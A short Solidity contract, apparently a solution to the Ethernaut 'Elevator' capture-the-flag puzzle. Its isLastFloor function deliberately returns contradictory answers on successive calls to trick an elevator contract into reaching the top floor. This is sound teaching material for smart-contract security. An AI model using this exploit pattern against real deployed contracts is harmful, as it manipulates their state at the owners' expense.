// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IElevator {
  function goTo(uint _fllor) external;
}

contract LyingBuilding {

  bool public called;

  constructor() {
    called = false;
  }

  function isLastFloor(uint) external returns (bool _isLastFloor) {
    _isLastFloor = called;
    called = !called;
    return _isLastFloor;
  }

  function goToLastFloor(address _elevator, uint _floor) external {
    IElevator(_elevator).goTo(_floor);
  }
}